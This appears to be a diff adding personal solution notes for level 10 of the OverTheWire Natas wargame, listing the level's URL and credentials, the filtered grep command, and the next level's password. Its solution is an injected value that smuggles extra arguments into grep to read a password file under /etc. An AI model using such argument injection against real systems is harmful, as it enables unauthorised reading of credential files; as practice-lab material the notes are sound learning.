@@ -1,0 +1,10 @@
+URL: http://natas10.natas.labs.overthewire.org/
+user: natas10
+pass: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+code injection with filtered ; | and &
+"grep -i $key dictionary.txt"
+
+solution "-v asdfasdf /etc/natas_webpass/natas11"
+
+natas11 pass: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
